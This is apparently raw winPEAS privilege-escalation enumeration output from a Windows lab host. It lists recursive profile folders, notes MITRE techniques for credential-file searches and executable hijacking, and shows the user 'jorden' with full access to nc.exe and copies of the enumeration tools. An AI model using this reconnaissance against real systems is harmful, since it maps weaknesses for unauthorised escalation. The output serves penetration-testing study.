     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                     
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                     
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                        
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                    
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                    
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                       
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                            
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                   
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                   
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                  
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                  
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                   
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                   
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                       
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                    
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                    
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                             
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                 
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                        
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                     
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                                     
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                                
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                         
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                                                       
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                                                                       
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                                                                  
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                                           
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                                      
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                      
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                               
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                                   
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                          
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                                                                        
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                                                        
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                                                                 
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                                                                     
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                                                            
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                                                                                                         
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                                                                                                    
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Temporary Internet Files
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\History
     C:\Users\cyork\AppData\Local\Application Data\Application Data\History\Low\History.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\History\History.IE5\MSHist012020010920200110
     C:\Users\cyork\AppData\Local\Application Data\Application Data\History\History.IE5
     C:\Users\cyork\AppData\Local\Temporary Internet Files
     C:\Users\cyork\AppData\Local\Temporary Internet Files\Low\Content.IE5
     C:\Users\cyork\AppData\Local\Temporary Internet Files\Low\IE
     C:\Users\cyork\AppData\Local\Temporary Internet Files\IE
     C:\Users\cyork\AppData\Local\Temporary Internet Files\Content.IE5
     C:\Users\cyork\AppData\Local\History
     C:\Users\cyork\AppData\Local\History\Low\History.IE5
     C:\Users\cyork\AppData\Local\History\History.IE5\MSHist012020010920200110
     C:\Users\cyork\AppData\Local\History\History.IE5
     C:\Users\cyork\My Documents\My Videos
     C:\Users\cyork\My Documents\My Pictures
     C:\Users\cyork\My Documents\My Music
     C:\Users\cyork\Cookies\DNTException
     C:\Users\cyork\Documents\My Videos
     C:\Users\cyork\Documents\My Pictures
     C:\Users\cyork\Documents\My Music
     C:\Users\cyork\Local Settings\History\History.IE5
     C:\Users\cyork\Local Settings\History\History.IE5\MSHist012020010920200110
     C:\Users\cyork\Local Settings\History\Low\History.IE5
     C:\Users\cyork\Local Settings\History
     C:\Users\cyork\Local Settings\Temporary Internet Files\Content.IE5
     C:\Users\cyork\Local Settings\Temporary Internet Files\IE
     C:\Users\cyork\Local Settings\Temporary Internet Files\Low\IE
     C:\Users\cyork\Local Settings\Temporary Internet Files\Low\Content.IE5
     C:\Users\cyork\Local Settings\Temporary Internet Files
     C:\Users\cyork\Local Settings\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\cyork\Local Settings\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\cyork\Local Settings\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Temporary Internet Files
     C:\Users\cyork\Local Settings\Application Data\Application Data\History\History.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\History\History.IE5\MSHist012020010920200110
     C:\Users\cyork\Local Settings\Application Data\Application Data\History\Low\History.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\History
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                                                           
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                                                                    
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                                                                
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                                                       
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                                                                       
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                                                                                                   
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                                                                                                        
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                                          
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                                                                 
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                                                                      
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                                                      
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                         
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                                  
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                              
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                     
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                                     
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                        
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                               
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                                    
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                    
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                       
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                            
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                   
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                   
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                 
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                      
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                  
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                  
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                 
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                   
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                   
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                       
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                  
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                  
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                           
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                               
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                      
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                    
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                    
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                             
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                 
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                        
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                                     
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                                                     
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                                                
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                         
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                                                      
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                                      
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                                               
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                                                   
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                                          
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                                                                       
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                                                                                       
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                                                                                  
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                                                           
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                                                                                                                    
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                                                                        
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\History
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\History\Low\History.IE5
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110
     C:\Users\cyork\Local Settings\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\cyork\Local Settings\Application Data\History
     C:\Users\cyork\Local Settings\Application Data\History\Low\History.IE5
     C:\Users\cyork\Local Settings\Application Data\History\History.IE5\MSHist012020010920200110
     C:\Users\cyork\Local Settings\Application Data\History\History.IE5
     C:\Users\cyork\Local Settings\Application Data\Temporary Internet Files
     C:\Users\cyork\Local Settings\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\cyork\Local Settings\Application Data\Temporary Internet Files\Low\IE
     C:\Users\cyork\Local Settings\Application Data\Temporary Internet Files\IE
     C:\Users\cyork\Local Settings\Application Data\Temporary Internet Files\Content.IE5

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching interesting files in other users home directories (can be slow)
 (T1552.001)                                                                                                                                                
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow) (T1574.001)
     File Permissions "C:\Documents and Settings\jorden\My Documents\nc.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\jorden\Documents\nc.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\winPEASany.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\accesschk64a.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\accesschk64.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\accesschk.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                                                                                                               
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                                                                                                             
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                                                                                                              
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                                                                                                                
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                                                                             
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                                                                           
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                                                                            
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                                                                              
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                                           
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                                         
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                                          
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                                            
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                         
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                       
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                        
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                          
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]       
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]     
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]      
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]        
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                         
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                       
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                      
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                        
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                           
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                         
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                        
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                          
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                                                             
